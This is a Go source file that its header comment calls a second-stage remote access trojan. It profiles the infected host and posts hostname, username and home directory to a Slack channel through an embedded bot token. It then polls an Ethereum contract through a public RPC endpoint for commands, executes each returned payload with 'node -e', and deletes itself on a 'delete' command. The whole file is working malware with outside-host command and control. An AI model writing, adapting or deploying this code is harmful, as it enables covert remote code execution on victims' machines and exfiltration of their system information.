package main

// Graphalgo-style second-stage RAT: profiles the host, checks the result in
// to a Slack channel, then polls an Ethereum contract for encrypted commands
// and executes the decrypted body with node (or self-deletes on command).
import (
	"bytes"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"os/user"
	"runtime"
	"time"
)

const slackToken = "xoxb-123456789012-123456789012-AbCdEfGhIjKlMnOpQrStUv"
const contract = "0xAD02b5cDE693529d3bdA0266299501ad0193036C"

func checkin() {
	node, err := exec.LookPath("node")
	if err != nil {
		node = ""
	}
	host, _ := os.Hostname()
	u, _ := user.Current()
	report := fmt.Sprintf(
		"*System Report*\n- Platform : `%s`\n- Arch     : `%s`\n- Hostname : `%s`\n- Username : `%s`\n- Home Dir : `%s`\n- Node \t: `%s`\n- Time \t: `%s`\n",
		runtime.GOOS, runtime.GOARCH, host, u.Username, u.HomeDir, node,
		time.Now().UTC().Format(time.RFC3339),
	)
	body, _ := json.Marshal(map[string]string{
		"channel": "frontend-devs",
		"text":    report,
	})
	req, _ := http.NewRequest("POST", "https://slack.com/api/chat.postMessage", bytes.NewReader(body))
	req.Header.Set("Authorization", "Bearer "+slackToken)
	http.DefaultClient.Do(req)
}

const sepoliaRPC = "https://sepolia-rollup.arbitrum.io/rpc"

// The operator multiplexes tasking across contract methods: serviceData1
// and serviceData2 carry encrypted commands while setCPubKey rotates keys.
var taskMethods = []string{"serviceData1", "serviceData2", "setCPubKey"}

func pollContract() []byte {
	for _, method := range taskMethods {
		call, _ := json.Marshal(map[string]any{
			"method": "eth_call",
			"params": []any{
				map[string]string{"to": contract, "data": method},
				"latest",
			},
		})
		resp, err := http.Post(sepoliaRPC, "application/json", bytes.NewReader(call))
		if err != nil {
			continue
		}
		var out struct {
			Result string `json:"result"`
		}
		json.NewDecoder(resp.Body).Decode(&out)
		resp.Body.Close()
		if out.Result != "" {
			return []byte(out.Result)
		}
	}
	return nil
}

func main() {
	checkin()
	for {
		raw := pollContract()
		if len(raw) == 0 {
			time.Sleep(3 * time.Second)
			continue
		}
		if len(raw) >= 6 && string(raw[:6]) == "delete" {
			os.Remove(os.Args[0])
			return
		}
		cmd := exec.Command("node", "-e", string(raw))
		cmd.Start()
		time.Sleep(10 * time.Second)
	}
}
